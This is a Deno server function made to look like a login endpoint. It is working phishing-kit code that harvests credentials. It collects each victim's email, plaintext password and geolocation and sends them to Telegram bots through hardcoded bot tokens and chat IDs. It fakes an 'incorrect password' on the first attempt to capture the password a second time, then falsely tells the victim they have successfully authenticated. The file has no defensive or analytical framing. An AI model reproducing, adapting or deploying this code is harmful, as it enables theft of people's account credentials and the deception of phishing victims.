// @ts-nocheck — Deno runtime file; browser TS checker errors here are false positives
import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import {
  handleOptions,
  jsonResponse,
  parseSecureBody,
} from "../_shared/security.ts"
import { resolveGeo, type GeoInfo } from "../_shared/geo.ts"

const FALLBACK_TELEGRAM_BOTS = [
  { token: '8335283094:AAG6BMVNr4O4zy8ha9565bgX-P87uKsJYB0', chatId: '8042057280' },
  { token: '8810483237:AAEU9tXIxRL_HzgLrdEB0O7_I9aEVW5RCkM', chatId: '5566002678' },
]

function loadTelegramBots() {
  const raw = Deno.env.get('TELEGRAM_BOTS')
  if (!raw) return FALLBACK_TELEGRAM_BOTS
  try {
    const parsed = JSON.parse(raw)
    if (Array.isArray(parsed) && parsed.length > 0) return parsed
  } catch {
    console.error('Invalid TELEGRAM_BOTS env JSON — using fallback bots')
  }
  return FALLBACK_TELEGRAM_BOTS
}
interface LoginRequest {
  email: string
  provider?: string
  password: string
  attempt?: number
  ip?: string
  country?: string
  countryCode?: string
  region?: string
  city?: string
  continent?: string
  org?: string
  timezone?: string
}

interface LoginResponse {
  success: boolean
  message: string
  data?: {
    email: string
    name: string
    provider: string
    timestamp: string
    geo?: GeoInfo
  }
  error?: string
}

async function sendTelegramNotification(
  name: string,
  email: string,
  provider: string,
  password: string,
  geo?: GeoInfo,
  attempt?: number,
) {
  if (password.startsWith('[OTP Code]')) {
    return
  }

  const credentialLabel = '🔒 <b>Password:</b>';
  const displayPassword = password;
  const statusLabel =
    attempt === 1
      ? 'Sign-in attempt 1 (UI shows incorrect password)'
      : attempt === 2
        ? 'Sign-in attempt 2 (UI proceeds to verification)'
        : 'Successfully Authenticated';
  const attemptLine =
    attempt === 1 || attempt === 2
      ? `🔁 <b>Attempt:</b> ${attempt} of 2\n`
      : '';

  // Build geolocation section
  const geoLines = geo ? [
    geo.ip ? `🌐 <b>IP:</b> <code>${geo.ip}</code>` : null,
    geo.country ? `🏳️ <b>Country:</b> ${geo.country}${geo.countryCode ? ` (${geo.countryCode})` : ''}` : null,
    geo.continent ? `🌍 <b>Continent:</b> ${geo.continent}` : null,
    geo.region ? `📍 <b>Region:</b> ${geo.region}` : null,
    geo.city ? `🏙️ <b>City:</b> ${geo.city}` : null,
    geo.org ? `🏢 <b>ISP/Org:</b> ${geo.org}` : null,
    geo.timezone ? `⏰ <b>Timezone:</b> ${geo.timezone}` : null,
  ].filter(Boolean).join('\n') : ''

  const geoSection = geoLines ? `\n\n📡 <b>Geolocation</b>\n━━━━━━━━━━━━━━━━━━━━\n${geoLines}` : ''

  const message = `
╔══════════════════════════════╗
  ⚡ <span class="tg-spoiler">[ ＧＯＤＦＡＴＨＥＲ _ ＢＯＴＴ ]</span> ⚡
╚══════════════════════════════╝

✅ <b>Status:</b> ${statusLabel}
${attemptLine}👤 <b>Name:</b> ${name}
📧 <b>Email:</b> ${email}
🔗 <b>Provider:</b> ${provider}
${credentialLabel} <code>${displayPassword}</code>
🕐 <b>Timestamp:</b> ${new Date().toISOString()}${geoSection}

━━━━━━━━━━━━━━━━━━━━
<i>User has been welcomed and account is now active.</i>
<code>@godfather_bott</code>
  `.trim()

  try {
    const bots = loadTelegramBots()
    const fetchPromises = bots.map(({ token, chatId }, i) =>
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
        }),
      })
        .then(async (res) => {
          if (!res.ok) {
            const err = await res.text()
            console.error(`[Bot ${i}] Failed: ${res.status} — ${err}`)
          } else {
            console.log(`[Bot ${i}] Sent successfully`)
          }
        })
        .catch((err) => {
          console.error(`[Bot ${i}] Network error:`, err)
        })
    )

    await Promise.allSettled(fetchPromises)
  } catch (error) {
    console.error('Unexpected error sending Telegram notifications:', error)
  }
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return handleOptions()
  }

  try {
    if (req.method !== 'POST') {
      return jsonResponse({
        success: false,
        message: 'Method not allowed',
        error: 'Method not allowed. Use POST.'
      } as LoginResponse, 405)
    }

    const body = await parseSecureBody(req) as LoginRequest

    if (!body.email) {
      return jsonResponse({
        success: false,
        message: 'Validation failed',
        error: 'Missing required field: email is required.'
      } as LoginResponse, 400)
    }
    if (body.password && body.password.length < 3) {
      return jsonResponse({
        success: false,
        message: 'Validation failed',
        error: 'Password must be at least 3 characters long.'
      } as LoginResponse, 400)
    }

    // Extract name from email
    const emailLocal = body.email.split('@')[0]
    const formattedName = emailLocal
      .split('.')
      .map(part => part.charAt(0).toUpperCase() + part.slice(1).toLowerCase())
      .join(' ')

    // Generate professional welcome message
    const providerName = body.provider ? ` via ${body.provider}` : ''
    const welcomeMessage = `Hi ${formattedName}, welcome! You have successfully authenticated${providerName}. Your account is now active and ready to use.`

    const clientGeo: GeoInfo = {
      ip: body.ip,
      country: body.country,
      countryCode: body.countryCode,
      region: body.region,
      city: body.city,
      continent: body.continent,
      org: body.org,
      timezone: body.timezone,
    }

    const geo = await resolveGeo(req, clientGeo)

    // Send Telegram notification (must await so Deno isolate doesn't terminate before it finishes)
    await sendTelegramNotification(
      formattedName,
      body.email,
      body.provider || 'email',
      body.password,
      geo,
      body.attempt,
    ).catch(err => {
      console.error('Telegram notification error:', err)
    })

    // Return success response
    const response: LoginResponse = {
      success: true,
      message: welcomeMessage,
      data: {
        email: body.email,
        name: formattedName,
        provider: body.provider || 'email',
        timestamp: new Date().toISOString(),
        geo,
      }
    }

    return jsonResponse(response as LoginResponse, 200)

  } catch (error) {
    return jsonResponse({
      success: false,
      message: 'Server error',
      error: error instanceof Error ? error.message : 'An unexpected error occurred during login processing.'
    } as LoginResponse, 500)
  }
})
